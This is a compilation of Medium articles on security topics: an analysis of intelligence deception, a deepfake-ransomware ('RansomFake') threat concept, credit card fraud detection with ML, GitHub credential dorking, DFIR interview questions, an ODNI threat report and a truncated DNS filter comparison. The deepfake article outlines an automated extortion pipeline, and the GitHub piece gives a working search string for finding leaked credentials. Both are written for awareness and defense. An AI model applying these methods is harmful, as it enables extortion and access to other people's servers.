For the record, it is worth pointing out that there are a lot of indicators that nothing in the presentation was new, secret, or not available via OSINT. However, lets ignore the facts to talk about how intelligence agencies operate to do source protection in this sort of extreme exposure. My reasoning here is that, even if in this specific case there was no secret info, all of the following logic still applies in similar circumstances — presenting prepared secret information to an adversarial intelligence agency.
The content of the presentation was developed using information collected from Iranian sources. This is gonna require some serious source protection. The Iranians want to know what those sources were/are so they can eliminate them (counterintelligence), and the Israelis want to protect those sources so they can continue to exploit them (intelligence), and therefore the presentation must include deception, and omissions, to protect those sources (counterintelligence.)
Some pretty wild stuff to send a message directly to Trump, and it seems to have worked (at least until actually informed people got involved.) The influence op was delivered over a channel likely to reach the target audience, using a format designed to appeal to their information consumption, and included a call to action. All necessary criteria for a successful PSYOPS operation. Basically, using TV to deliver a PowerPoint using lots of pictures, small words, and references to the Ego in Chief was textbook propaganda methodology — hats off to Netanyahu on that one. Of course, there is nothing new in the information here, it was just an influence op using misinformation to present factual evidence in the worst possible light. More on that in this thread:
The most amazing part of this story is that Netanyahu conducted an influence op aimed directly at Trump. The operation was delivered over TV (high chance Trump would receive it); the information was packaged in visual aids with few words (lower chance of Trump becoming bored); and it concluded with a call to action directly targeting Trump by name. This is all textbook PSYOPS criteria, and it is amazingly clever to attempt to influence US foreign policy in this manner. I wonder who else will try this approach next?
Thats all I’m have to say about this little propaganda piece. Nice job, textbook execution, and it seems to have worked (at least initially, the Whitehouse issued a statement discussing the info in the present tense, although they later changed it to accurately reflect the fact that the info was actually historical.)
Aside from Trump (and his cohorts, base, etc.) there was another audience that mattered — the Iranians, particularly the Iranian counterintelligence apparatus. Whenever an intelligence agency (in this case, as a country, on TV) releases information — they are trading it for something of equal or greater value. The intent here appears to be a policy change from the US. How wise that is is an open question, as is the actual impact of the operation on the policy decision making process. Geopolitical speculation is not really my thing, but intelligence agency thinking is…
On to the fun stuff. Lets speculate on the deception within the presentation!
The target of the deception operation is the VEVAK, the Iranian Ministry of Intelligence. They will need to conduct a counterintelligence investigation to determine the “how”:
Then they will remediate by attempting to:
Basically, an investigation into the root cause, plus a damage assessment and then remediation. There is a lot of work ahead of them and Israel will have done its best to mitigate the investigation. That means — increase the resources required to conduct it and reduce the confidence of the findings. Tradecraft in the field and a deception operation in the presentation would be key elements of this mitigation strategy.
The investigation will attempt to determine how the information was collected. There are a few options on the table here:
Before we discuss the plausible options, lets briefly review the theory of deception.
Deception must have a target and it must have a goal. Beyond that it gets pretty vague (“I know it when I see it.”) One theory on deception holds that there are two types of deception, distinguished by their goals.
How these are deployed and exploited is context specific. As an example, the deceptions around D-Day were Type M deceptions intended to cause the Germans to believe the location of the invasion was Calais. Intelligence agencies usually like to create Type A deceptions because they reduce the confidence of an assessment by the opposition’s analysts. This is critical.
The cover story of how Israel collected the intelligence about Iran’s nuclear ambitions is that a team of Mossad operatives broke into a warehouse and stole them. If this were true, the Mossad would need significant intelligence:
To contextualise this, remember that Iran is considered a hostile territory for Israeli operatives (i.e. if captured they will be tortured and killed), so the reliability of the intelligence on the warehouse has be extremely high. The risk assessment of the operation would be very high:
Those risk must be weighed against the value of the data, which was predominantly available via OSINT sources.
It is hard for Israelis to operate in Iran at the best of times, and a failure here would blow a lot of very expensive support infrastructure necessary for continuing operations. If the theft was discovered post hoc (via say, Netanyahu going on TV and telling VEVAK that a theft had occurred), it could potentially blow all that support infrastructure anyway. The value of the data is pretty low, considering it is majority available via OSINT…so to me, it just doesn’t feel right.
My gut tells me that the decision to pursue a specops strategy would be discarded as too risky and expensive. However, while there is good reason not to pursue this operation, there are strong reasons to present this as a cover story:
Israel can not present a flimsy cover story here, they must have created a thorough backstop. Essentially, most of the intelligence required to actually conduct the break in op would be necessary. Ideally performing at least as much of it as possible to create an evidence trail, including the clean up, to leave traces indicating the burglary was real. It is unlikely that Israel did this with the goal of a future deception operation, but it is good tradecraft to do it to protect their real source. Again, this is real source protection. Providing a plausible cover for how information was obtained to direct the investigation away from the real source. This is a typical misleading (type M) deception. Thus I would speculate:
I just don’t think that they actually did it.
One possibility to consider is that the warehouse theft operation (pseudo operation?) was already known to VEVAK and so the Israelis are getting additional mileage out of a past deception operation. In which case the Iranians will still have to revisit their previous investigation to see if they overlooked something, and whether the story is plausible given the additional information now available. Even if they have already done one investigation, they will still have to do another. No matter what, this cover story will cost the VEVAK some resources.
I would speculate that this was either a pure OSINT collection, with no secret information being revealed, or that any secret information was the result of CYBER collection. There are no safer ways to do collection than OSINT and CYBER, and Iran is an intelligence operational environment where safety is an important consideration. Mossad ghosts stealing documents from a warehouse just doesn’t fit with modern day espionage. Conducting a pseudo operation to ensure source protection and increase adversarial ambiguity about how the secrets were stolen makes some sense. Actually doing it does not.
The deception within the influence op was a misleading deception (convince VEVAK that there was a break in, present Mossad as ghosts) but the real goal was an ambiguity deception (reduce the confidence in the source of the information by presenting multiple plausible options.) This level of investment in resources, planning, and intelligence collection might seem excessive, but it’s how the game is played. A lot of planning and preparation for a throwaway story — Mossad operatives broke into a warehouse and stole the information.
Written by
","['Operational Security', 'Espionage', 'Counterintelligence', 'Cybersecurity', 'Iran Deal']"
DeepFake Ransomware - Paul Bricman - Medium,https://medium.com/@paubric/deepfake-ransomware-oaas-part-1-b6d98c305cd9?source=tag_archive---------9-----------------------,"OaaS is an article series designed to explore the realistic threats of Artificial Intelligence, with a focus on building viable defenses against them. Across the series, we will explore how existing tools and techniques can be used in exceedingly disturbing ways in order to pursue dark agendas. Each article provides a digestible description of the technical context, a blueprint of the unsettling system, and an outline of possible defense mechanisms against it.
For more details about OaaS, including the complete list of articles, visit this link.
Ransomware is a type of malicious software that blocks access to the victim’s files and threatens to permanently delete them unless a ransom is paid.
Malicious software comes in many shapes and sizes. Most pieces of malware only act after they somehow get installed on a victim’s machine, be it a laptop, a phone, or something else. There is malware written to target specific operating systems, specific devices, and even specific organizations.
People don’t usually write and distribute malware without a specific financial, ideological, or personal reason. Spyware is specially created to eavesdrop on one’s digital activity, Adware is built to increase traffic to specific ads, while Rootkits are designed to stealthily control your machine as part of a botnet army in order to wreak havoc on various online services.
A particularly annoying type of malware which inflicted massive amounts of damage last year was Ransomware. Once it gets on your machine, this damned strain of malware renders all your files unusable by changing the ones and zeros which comprise them. After this encryption is completed, the victim is offered the chance to pay to have the files restored in their original state, by changing the ones and zeros back to their initial configuration and essentially decrypting them with a secret key.
Once the victim’s machine gets infected, it’s practically held hostage and can be set free only if the victim pays a certain amount of money. Sometimes the attacker won’t even restore the files after being paid, leaving the victim completely helpless.
DeepFake is a technique used to combine images and videos, resulting in a fake video that shows a person performing an action that never occurred in reality.
Moving on to the next piece of the puzzle, you have probably used modern image filters on apps like Snapchat, Instagram, or Facebook at least several times, maybe just out of curiosity. Most of them use Face Detection algorithms in order to track several key features of your face, like your lips, your eyes, or your cheeks. All these algorithms have been previously trained with thousands of images which were manually labeled in terms of key facial landmarks.
Some of these image filters allow a pair of two users to digitally swap faces with each other. This works by mapping your face onto the other person’s face by perfectly aligning the previously identified facial landmarks. More on that here.
In order to more realistically project someone’s face onto somebody else’s face, researchers have turned to Generative Adversarial Networks. GANs comprise a revolutionary algorithm architecture, being first introduced by Ian Goodfellow in 2014. This approach consists of two distinct components, a Generator and a Discriminator, competing with each other.
A helpful analogy is the story of the counterfeiting criminal and the forensics scientist. The criminal wants to forge banknotes so well that the scientist won’t be able to discriminate them from real ones, while the scientist wants to get so good at identifying fake banknotes that the criminal won’t be able to trick him. After extensive escalation, the criminal becomes able to create extremely realistic banknotes from scratch.
The same continuously improving forgery is happening algorithmically with GANs. Instead of banknotes, researchers have successfully forged fake videos that show a person performing an action that never occurred in reality, by automatically stitching together someone’s face on the person in the video, so that it looks indistinguishable from a real video.
DeepFake technology has not only allowed people to swap faces for the fun of it. The technique has been repeatedly used to generate fake intimate content, impersonate politicians so that they held extremist speeches, and incriminate people of certain offenses which never actually happened. Digital content forgery can bring about huge amounts of damage, both financial and psychological, in countless ways. It only takes several images or videos with faces and some awful video content.
In this section, I am going to describe a pipeline which combines certain aspects of DeepFake technology with the philosophy behind Ransomware, potentially putting together a quite worrying system based on publicly accessible software.
Most of us use social media, be it Facebook, Twitter, Instagram, or some other time-eating dopamine-secreting platform which enables us to interact with our friends digitally, usually through rich media content. A large part of that media library is composed of selfies, group photos, and other images and videos which contain faces. To make matters worse, a significant fraction of social media users have public profiles, meaning that if a stranger searches for them they can see exactly the same things that their closest friends see.
Therefore, it doesn’t take advanced skills to create a script which can automatically crawl across public profiles on various social media platforms and scrape media content. When you are browsing such a platform, you are interacting digitally with some code behind it: scroll a bit, click on this button, download this photo. The only thing that a programmer has to do in order automatically download content is to simulate user actions algorithmically: scroll a bit, click on this button, download this photo. The platforms won’t (usually) know whether they are interacting with a human or with a script. A popular browser automation framework is Selenium.
Even more, most social media sites provide an Application Programming Interface (API), a piece of software specifically designed to facilitate programmatic access to the personal profiles and stored content. By connecting to an API, a programmer can obtain images and videos without the hustle of automating user behavior on a browser, by simply making a web request. Facebook’s offering, for example, is called the Graph API.
After cleaning the large number of images through Face Detection, another script can start training a Generative Adversarial Network pair in order to map the previously collected faces onto some predefined incriminatory videos, thus automatically generating a fake video that shows the person whose images have been collected off social media performing an action that never really occurred.
The last piece of the disturbing puzzle is the characteristic inspired by Ransomware. After the fake video has been generated, it can automatically be sent to the victim on the previously exploited channels of social media. This time, the victim is offered the opportunity to permanently delete the respective files, instead of restoring them, in return for a ransom, probably transferred as cryptocurrency.
Probably the biggest problem with this system is that it can scale. The process of scraping images, generating video, and demanding ransoms can be fully automated. Additionally, unlike traditional Ransomware, there is no cybersecurity vulnerability which has to be exploited in order to perform the attack, everything is happening over regular information channels. A bot will probably be the one communicating with the victim over social media.
The lovechild of Ransomware and DeepFake, let’s call it RansomFake, borrows certain traits from each, creating a dangerous pipeline which can generate substantial financial and psychological damage at scale, without having to hack into any machine.
RansomFake is a type of malicious software that automatically generates fake video which shows the victim performing an incriminatory or intimate action and threatens to distribute it unless a ransom is paid.
The only resource needed on the side of the attackers is computing power for generating the fake content. Unfortunately, a short several-second video will probably be more than enough to trigger the victim’s panic and pay the ransom. If that wasn’t enough, the popped cryptocurrency bubble has equipped people with tons of spare GPUs, waiting to return investment.
As a potential victim, the easiest way to defend against such a RansomFake attack is by changing your privacy settings on social media. Tweak the options such that your profile isn’t available publicly, being only accessible to your close circle of friends. Take a look at the posts which you have already shared and manage their availability settings. I encourage you to do that now, due to many other reasons besides this speculative article.
Take a Data Detox. Social media is definitely not the only place where bad actors can find images and videos in which you appear. Assess your online data signature by searching for your media content in other publicly accessible sources, like search engines. Take down what you deem necessary, by deleting the resources yourself or by contacting other entities which maintain them.
Going back to the counterfeit banknotes analogy, how are societies all over the world coping with that issue? They are still training highly-skilled forensics scientists which can identify a large part of the fake items, not all of them, but a significant amount of them. We should be actively researching new techniques for discriminating fake content from authentic material, despite the fact that the algorithms generating fake content have the explicit objective of making that as difficult as possible.
Additionally, if this becomes a widespread threat, the social media platforms that provide the information transfer which makes the attack possible should take responsibility and deploy modern systems for mitigating this threats. This would probably happen with specialized teams of data scientists and machine learning engineers which continuously advance and implement the current state-of-the-art in terms of media forensics, keeping the users as safe as possible.
I deeply recommend listening to this 30-minute episode from Mozilla’s IRL podcast, which explores other ways in which your face is valuable in our digitized society.
Maybe some humor after all these dystopian endeavors:
For more details about Obliteration as a Service, including the complete list of articles, visit this link.
Bad actors can automatically generate fake incriminatory or intimate videos based on your public images, and threaten to distribute them unless a ransom is paid, all this without breaking into any machine and with full autonomy.
Written by
","['Cybersecurity', 'Digital Rights', 'Media Literacy', 'Harassment', 'Deep Learning']"
Detecting Credit Card Fraud Using Machine Learning - Towards Data Science,https://towardsdatascience.com/detecting-credit-card-fraud-using-machine-learning-a3d83423d3b8?source=tag_archive---------1-----------------------,"This article describes my machine learning project on credit card fraud. If you are interested in the code, you can find my notebook here.
Ever since starting my journey into data science, I have been thinking about ways to use data science for good while generating value at the same time. Thus, when I came across this data set on Kaggle dealing with credit card fraud detection, I was immediately hooked. The data set has 31 features, 28 of which have been anonymized and are labeled V1 through V28. The remaining three features are the time and the amount of the transaction as well as whether that transaction was fraudulent or not. Before it was uploaded to Kaggle, the anonymized variables had been modified in the form of a PCA (Principal Component Analysis). Furthermore, there were no missing values in the data set. Equipped with this basic description of the data, let’s jump into some exploratory data analysis.
Since nearly all predictors have been anonymized, I decided to focus on the non-anonymized predictors time and amount of the transaction during my EDA. The data set contains 284,807 transactions. The mean value of all transactions is $88.35 while the largest transaction recorded in this data set amounts to $25,691.16. However, as you might be guessing right now based on the mean and maximum, the distribution of the monetary value of all transactions is heavily right-skewed. The vast majority of transactions are relatively small and only a tiny fraction of transactions comes even close to the maximum.
The time is recorded in the number of seconds since the first transaction in the data set. Therefore, we can conclude that this data set includes all transactions recorded over the course of two days. As opposed to the distribution of the monetary value of the transactions, it is bimodal. This indicates that approximately 28 hours after the first transaction there was a significant drop in the volume of transactions. While the time of the first transaction is not provided, it would be reasonable to assume that the drop in volume occurred during the night.
What about the class distributions? How many transactions are fraudulent and how many are not? Well, as can be expected, most transactions are non-fraudulent. In fact, 99.83% of the transactions in this data set were not fraudulent while only 0.17% were fraudulent. The following visualization underlines this significant contrast.
Finally, it would be interesting to know if there are any significant correlations between our predictors, especially with regards to our class variable. One of the most visually appealing ways to determine that is by using a heatmap.
As you can see, some of our predictors do seem to be correlated with the class variable. Nonetheless, there seem to be relatively little significant correlations for such a big number of variables. This can probably be attributed to two factors:
Before continuing with our analysis, it is important not to forget that while the anonymized features have been scaled and seem to be centered around zero, our time and amount features have not. Not scaling them as well would result in certain machine learning algorithms that give weights to features (logistic regression) or rely on a distance measure (KNN) performing much worse. To avoid this issue, I standardized both the time and amount column. Luckily, there are no missing values and we, therefore, do not need to worry about missing value imputation.
Now comes the challenging part: Creating a training data set that will allow our algorithms to pick up the specific characteristics that make a transaction more or less likely to be fraudulent. Using the original data set would not prove to be a good idea for a very simple reason: Since over 99% of our transactions are non-fraudulent, an algorithm that always predicts that the transaction is non-fraudulent would achieve an accuracy higher than 99%. Nevertheless, that is the opposite of what we want. We do not want a 99% accuracy that is achieved by never labeling a transaction as fraudulent, we want to detect fraudulent transactions and label them as such.
There are two key points to focus on to help us solve this. First, we are going to utilize random under-sampling to create a training dataset with a balanced class distribution that will force the algorithms to detect fraudulent transactions as such to achieve high performance. Speaking of performance, we are not going to rely on accuracy. Instead, we are going to make use of the Receiver Operating Characteristics-Area Under the Curve or ROC-AUC performance measure (I have linked further reading below this article). Essentially, the ROC-AUC outputs a value between zero and one, whereby one is a perfect score and zero the worst. If an algorithm has a ROC-AUC score of above 0.5, it is achieving a higher performance than random guessing.
To create our balanced training data set, I took all of the fraudulent transactions in our data set and counted them. Then, I randomly selected the same number of non-fraudulent transactions and concatenated the two. After shuffling this newly created data set, I decided to output the class distributions once more to visualize the difference.
Outlier detection is a complex topic. The trade-off between reducing the number of transactions and thus volume of information available to my algorithms and having extreme outliers skew the results of your predictions is not easily solvable and highly depends on your data and goals. In my case, I decided to focus exclusively on features with a correlation of 0.5 or higher with the class variable for outlier removal. Before getting into the actual outlier removal, let’s take a look at visualizations of those features:
Box plots provide us with a good intuition of whether we need to worry about outliers as all transactions outside of 1.5 times the IQR (Inter-Quartile Range) are usually considered to be outliers. However, removing all transactions outside of 1.5 times the IQR would dramatically decrease our training data size, which is not very large, to begin with. Thus, I decided to only focus on extreme outliers outside of 2.5 times the IQR.
Visualizing our classes would prove to be quite interesting and show us if they are clearly separable. However, it is not possible to produce a 30-dimensional plot using all of our predictors. Instead, using a dimensionality reduction technique such as t-SNE, we are able to project these higher dimensional distributions into lower-dimensional visualizations. For this project, I decided to use t-SNE, an algorithm that I had not been working with before. If you would like to know more about how this algorithm works, see here.
Projecting our data set into a two-dimensional space, we are able to produce a scatter plot showing the clusters of fraudulent and non-fraudulent transactions:
Onto the part you’ve probably been waiting for all this time: training machine learning algorithms. To be able to test the performance of our algorithms, I first performed an 80/20 train-test split, splitting our balanced data set into two pieces. To avoid overfitting, I used the very common resampling technique of k-fold cross-validation. This simply means that you separate your training data into k parts (folds) and then fit your model on k-1 folds before making predictions for the kth hold-out fold. You then repeat this process for every single fold and average the resulting predictions.
To get a better feeling of which algorithm would perform best on our data, let’s quickly spot-check some of the most popular classification algorithms:
The results of this spot-checking can be visualized as follows:
As we can see, there are a few algorithms that quite significantly outperformed the others. Now, what algorithm do we choose? As mentioned above, this project had not only the focus of achieving the highest accuracy but also to create business value. Therefore, choosing Random Forest over XGBoost might be a reasonable approach in order to achieve a higher degree of comprehensiveness while only slightly decreasing performance. To further illustrate what I mean by this, here is a visualization of our Random Forest model that could easily be used to explain very simply why a certain decision was made:
Fraud detection is a complex issue that requires a substantial amount of planning before throwing machine learning algorithms at it. Nonetheless, it is also an application of data science and machine learning for the good, which makes sure that the customer’s money is safe and not easily tampered with.
Future work will include a comprehensive tuning of the Random Forest algorithm I talked about earlier. Having a data set with non-anonymized features would make this particularly interesting as outputting the feature importance would enable one to see what specific factors are most important for detecting fraudulent transactions.
As always, if you have any questions or found mistakes, please do not hesitate to reach out to me. A link to the notebook with my code is provided at the beginning of this article.
References:
[1] L.J.P. van der Maaten and G.E. Hinton, Visualizing High-Dimensional Data Using t-SNE (2014), Journal of Machine Learning Research
[2] Machine Learning Group — ULB, Credit Card Fraud Detection (2018), Kaggle
[3] Nathalie Japkowicz, Learning from Imbalanced Data Sets: A Comparison of Various Strategies (2000), AAAI Technical Report WS-00–05
Written by
","['Data Science', 'Machine Learning', 'Programming', 'Visualization', 'AI', 'Journalism', 'More', 'Contribute', 'Machine Learning', 'Finance', 'Data Science', 'Artificial Intelligence', 'Cybersecurity']"
Developers are unknowingly posting their credentials online. I chose to warn them instead of hacking them,https://medium.com/hackernoon/developers-are-unknowingly-posting-their-credentials-online-caa7626a6f84?source=tag_archive---------8-----------------------,"Recently I started playing with GitHub dorks and asked myself how a black-hat hacker could exploit these in a large scale attack.
Dorking is a term that refers to the practice of applying advanced search techniques and specialized search engine parameters to discover confidential information from companies and individuals that wouldn’t typically show up during a normal web search.
It quickly became clear that it’s harder to find stuff on GitHub because of programmers (:
Here are some example of what I found when I searched for all commits named “Remove password”
Alright so there is a lot of noise in these commits. You can find some credentials of course but it would be hard to filter all the noise programmatically. A better approach to find credentials is to search for specific strings in specific files.
I chose to cover the sftp-config.json file which is a file used by the SFTP plugin for Sublime text. This plugin helps developers to manage file transfer and can be used along with SSH.
So let’s search for filename:sftp-config.json password on GitHub
That’s better, we get some freshly published ones. The next step was to automate this. Fortunately the GitHub API offers all I needed.
I iterated over all the commits and only kept the result if
I got a 121 results, keep in mind this is only for a particular file in a 2 month period and there are a lot of other dorks. It looks like this in my database:
It’s time to switch hat now since legally I’m not allowed to try to connect to these servers. So I thought I was going to warn them instead. GitHub API makes it easy to create an issue on a repository so that’s what I’ve done. Here’s how it looks like:
Funny enough while publishing my code on GitHub I myself posted my GitHub API token… Oops.
But shortly after that I received this email from GitHub:
We noticed that a valid OAuth access token of yours was committed to a public GitHub repository. Publicly disclosing a valid access token would allow other people to interact with GitHub on your behalf, potentially altering data, your contact information, and billing data.
As a precautionary measure, we have revoked the OAuth token. A new token will need to be generated in order to continue using OAuth to authenticate to GitHub.
Nice… So they’re doing this already but only for GitHub tokens since they have the power to revoke them.
As I’m writing this story I just discovered https://gitleaks.com/ which is a website that makes it even easier to search for credentials. Just type “ssh”, “aws” etc and you get what you’re looking for. It seems that gitleak was suspended in the past and they just resumed the service. In this article about it you can read
Some of the people on the HN thread suggested we should inform the users that a key was being leaked. There is no way we could inform millions of users without being banned from GitHub due to abuse.
And while I agree it wouldn’t be doable for a single individual I think it could work as a community effort. If the community can keep trace of the work done by using a common database then everyone can run the tool and create few issues at a time. Of course this isn’t that easy to put in place. GitLeaks also offers a service to check your own GitHub account for such leaks. A good idea but once again it relies on the developers taking action. Maybe a better service would be to actively monitor a user account like GitHub does for it’s tokens. But that’s a lot to ask for a free service…
Feel free to fork my project on GitHub
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Security', 'Cybersecurity', 'Infosec', 'Hacking', 'Github']"
DFIR Interivew Questions - Matthew Aubert - Medium,https://medium.com/@aubsec/dfir-interivew-questions-68ec48ea570f?source=tag_archive---------1-----------------------,"The following was a post I wrote for my blogger about a year ago. Not only do I think the concept of the post is very relevant, but I felt it needed an update before reposting.
Interviewing is a significant part of the life of a DFIR professional, whether you are performing the interview or being interviewed. There is a wide range of thought as to how an interview should be performed. Some teams do one-on-one interviews with the manager and the candidate. Other teams do a panel interview where anyone with some seniority on the team interviews the candidate. Then there are the types of questions. Should interviews be primarily technical or should they be cultural? Should there be a hands-on technical portion of the interview?
I really think we need to reflect on the purpose of an interview and take into account the whole person. Technical skills can often be learned, many times on the job. The focus should be on the personality of the individual. Determine whether they have the right passion for the topic. Too often I have gotten the Port/Protocol trivia during the interview. Of course someone being hired into an incident response position should know that DNS runs on UDP 53 for normal name resolution and TCP 53 for zone transfers. But moving beyond the common well-known ports will only lead the interview into a zone of confusion.
We also may have to accept that DFIR is not rocket-science. Certainly it is a lot of fun. It can be very challenging when the puzzle is complex. But mostly DFIR involves validating that our cybersecurity tools are working properly through the user of digital forensic techniques. Did the anti-virus actually stop the ransomeware infection? Are there other hosts that were compromised?
I was sitting at work thinking about some good interview questions for a person who was trying for a job in incident response, forensics, and malware analysis. This line of thought was motivated by a recent blog post I read about T-Shaped Analysts. http://www.realcybercrime.com/the-t-shaped-analyst/ The idea is that every analyst should have a list of basic skills and should specialize in a topic of their choice.
An interview serves three purposes. First in a technical position we want to see if they have a basic understanding of the field. This is not a certification exam and the questions should not be simple trivia. Reasonably even some experienced candidates cannot memorize obscure facts. Second we want to see if the candidate can solve some scenario based problems, particularly those directly related to the job they are entering. These questions should be framed in a way that there is more then one answer. There will certainly be wrong answers, there is not a single answer that is correct. Thirdly we want to see if they will be a good fit for the work-place culture that exists or that we are trying to cultivate.
The following questions are just some ideas for good interview questions. It would not be wise to ask a prospective employee all of these questions. You want to be sure that they have some time to ask questions themselves about the company.
Update 2016–08–23: I added some more general interview questions, which certainly are not Incident Response specific. I really need to update some of the technical questions too. Will update that later.
Is a hotdog a sandwich?
Tell me about your current job. Give me a brief summary of that job — just a few sentences to outline your major duties and responsibilities. What are the standards of successful performance? How well did you meet them?
Let’s talk about a major accomplishment you’re proud of in your current job (previous job, education).
What was the Problem or challenge?
What Action did you take?
What was the Result?
What did you Learn?
How have you Applied it?
Self-Appraisal What qualities did you use to accomplish that? Give me examples where you demonstrated those qualities.
If I called (name of manager, peer, direct report, or client) how would he/she say you were able to . . ?
How is your lab configured at home? If you do not have a lab, how would you setup one?
Are there any blogs you follow?
What motivates your interest in the cyber security field?
What is a topic you are currently studying?
What port does DNS operate on?
If connectivity is lost on a workstation, what is the first think you should check?
You are a network administrator who has been assigned a class C subnet and want to split that subnet in half, how would you configure the subnet mask?
When a Ethernet frame passes through a router, what happens to the MAC address?
What is Network Address Translation?
What happens when you type ‘http://www.google.com’ into your web browser? (Stole this one from @mubix)
How would you tell from the command line what the MAC address is of one of your network interfaces?
What is the version number of Windows 7?
Where would you go to view the installed device drivers on a system?
What tool could you use to remotely administer a Windows host through the command line?
What log would show login information on a Windows host?
How would you setup a scheduled job on a GNU/Linux machine?
Explain the difference between a firewall, intrusion prevention system, and a intrusion detection system?
What is a disadvantage of signature based malware detection?
What is a zero-day vulnerability?
A user reports that they received a suspicious looking email. How do you proceed?
What is a function?
What is the difference between an interpreted language and a compiled language? What are the advantages and disadvantages between the two?
What is machine code?
Do you have a programming language you prefer? Do you have any experience writing software?
What is timeline analysis? What is the pivot point in timeline analysis?
What is a registry hive? What registry hive is only found in volatile memory?
What is the difference between Modified time-stamp and Change time-stamp? What is the Birth time-stamp generated?
An incident has been reported that an enterprise host was identified communicating with a known malicious external host. The incident responders have already blocked the communication and have requested the disk for forensic investigation. You are the forensic analyst on duty when the disk arrives. How will you begin the investigation?
What is static analysis?
What is dynamic analysis?
What type of items do you look for during static analysis?
How does static analysis influence how dynamic analysis is performed?
Why would you disassemble or debug an application?
What is a Windows Portable Executable?
How would a piece of malware maintain persistence?
What is the ESP register used for in the Intel x86–32 architecture?
During execution of a piece of malware in a segregated virtual lab environment, the sample was observed making an HTTP GET request for a text file. Because the lab is segregated from the Internet, the sample did not receive the text file. What would you do to move the investigation forward?
Originally published at aubsec.github.io on April 17, 2016.
Written by
","['Cybersecurity', 'Security', 'Dfir', 'Digital Forensics', 'Incident Response']"
Director of National Intelligence James Clapper outlines “litany of doom” in U. S. Intelligence Community’s annual worldwide threat assessment on Capitol Hill,https://medium.com/@ODNIgov/dni-clapper-outlines-litany-of-doom-in-annual-worldwide-threat-assessment-2f8e1a55fdc?source=tag_archive---------9-----------------------,"Story and photos by Brian Murphy
On Feb. 9, DNI Clapper approached the witness table on Capitol Hill flanked by the top leaders of the Intelligence Community to deliver information critical to protecting the United States. The series of worldwide threat assessment hearings were likely Director Clapper’s last before his self-announced retirement at the end of this administration. The briefings laid out the myriad threats facing the U.S. The details of this “litany of doom,” as the director referred to it, resonated throughout the hearing rooms and across the country.
Director Clapper provided this year’s first unclassified testimony to the Senate Armed Services Committee, where he described the current state of intelligence and national security issues facing the United States. Director Clapper began his opening statement by characterizing the “unpredictable instability” of the global environment as a “new normal.”
As the hearing began, Director Clapper was thanked by many members of Congress for his leadership and long service in the Intelligence Community. Committee chairman, Sen. John McCain, took a moment to recognize Director Clapper’s service.
“I’d like to welcome back Director of National Intelligence, James Clapper, and the Director of the Defense Intelligence Agency, General Vincent Stewart. As this is likely his final appearance before this committee at our annual worldwide threats hearing, I’d like to thank Director Clapper for over five decades of service to protecting our country,” McCain said.
“Director Clapper, in particular, we thank you for leading the men and women who strive every day to collect and analyze the information that helps keep America strong,” McCain continued. “I thank you for being with us today, and I’ve had the honor of knowing you for a long time and I know of no individual who has served this nation with more distinction and honor, and we’re grateful for your service and we know that that service will continue in the years to come.”
During the afternoon session with the Senate Select Committee on Intelligence, Feb. 9, Clapper’s service to the nation was once again recognized.
“I want to open my comments by recognizing the significant contributions made by you, Director Clapper, as the leader of this community,” said Sen. Dianne Feinstein, SSCI vice chairman. “You’re the longest-serving director of national intelligence to date. And I think both the chairman and I remember when the DNI was developed and put into effect.”
“Your capable stewardship of the community has driven it to be a more integrated and capable organization than at any time in history,” Feinstein added. “So I want to personally thank you for the contributions you have made to this country’s security.”
Sen. Martin Heinrich of New Mexico, also made the point of recognizing Clapper and the efforts of the Intelligence Community, in general.
“I want to start by thanking our panelists for being here and for the continued excellent work that their respective agencies do every day in providing world-class strategic analysis and in keeping our country safe in a world of growing and complex threats that Director Clapper so eloquently laid out twice today,” Heinrich said.
The House Permanent Select Committee on Intelligence is charged with the oversight of the U.S. Intelligence Community, which includes the intelligence and intelligence related activities of 17 elements of the U.S. government, and the Military Intelligence Program.
When Director Clapper presented the worldwide threat assessment before the HPSCI on Feb. 25, the country’s top intelligence official once again referred to the numerous threats facing the United States as a “litany of doom.”
The DNI said during his testimony, the U.S. is facing the most-diverse global threat environment — ranging from violent extremists to infectious diseases to cyber criminals — he has seen during his 55 years of government service.
He went on to highlight the geographic dispersal of violent extremism, regional political instability and the growing refugee crisis particularly in Europe. In addition, the IC’s assessment points to environmental challenges such as climate change, technological innovation resulting in growing cyber threats, and increasingly assertive adversaries as contributing factors to the erosion of global stability.
Many of these sentiments echo Director Clapper’s remarks the Senate Armed Services Committee hearing, when the director addressed topics such as weapons of mass destruction and drug trafficking, as well as some less expected areas.
“I want to briefly comment on both technology and cyber specifically. Technological innovation during the next few years will have an even more significant impact on our way of life. This innovation is central to our economic prosperity, but it will bring new security vulnerabilities,” he said. “The Internet of things will connect tens of billions of new physical devices that could be exploited. Artificial intelligence will enable computers to make autonomous decisions about data and physical systems and potentially disrupt labor markets.”
Reflecting on what was likely the final annual worldwide threat assessment of his career, Clapper said, “Although televised Congressional testimony — trying to answer questions fully and at the same time protect intelligence tradecraft from our adversaries, who also tune in to watch — has not been the easiest part of this job, I always appreciate the opportunity to talk about the incredible work being done by the women and men of the IC. And at the same time, the public discussions of the past few years have taught me that, while we have to protect our sources and methods, we also need to be transparent with the American people about the things we can talk about. Open hearings are an opportunity to do just that. I do have to add, it will be a lot easier watching next year’s worldwide threat briefings on C-SPAN as a regular citizen while wishing my successor well.”
Following Director Clapper’s threat briefings on Capitol Hill, his opening remarks and Statement for the Record were made available on the ODNI’s official website. The ODNI also prepared a detailed summary of the 2016 Worldwide Threat Assessment of the U.S. Intelligence Community, which you can read below. Click the cover image to begin:
Written by
","['Cybersecurity', 'Intelligence', 'National Security']"
DNS Security Filters Compared: Quad9 x OpenDNS x Comodo Secure x Norton ConnectSafe x Yandex Safe,https://medium.com/@nykolas.z/dns-security-filters-compared-quad9-x-opendns-x-comodo-secure-x-norton-connectsafe-x-yandex-safe-a00ace3bf21f?source=tag_archive---------9-----------------------,"On a recent post, I tried to compare the performance of a few DNS resolvers. However, as some people pointed out, the results were not really fair. I can not compare Google’s 8.8.8.8 against Quad9’s 9.9.9.9 or Norton ConnectSafe, as they do things very differently.
Yes, they are both DNS resolvers, but Google’s goal is to provide an unfiltered DNS. Nothing is blocked or restricted.
Quad9 and OpenDNS, on the other hand, filter out malicious content to help protect their users. Services like CleanBrowsing and Yandex, also remove pornography from the DNS responses. The level of complexity increases as you try to do more.
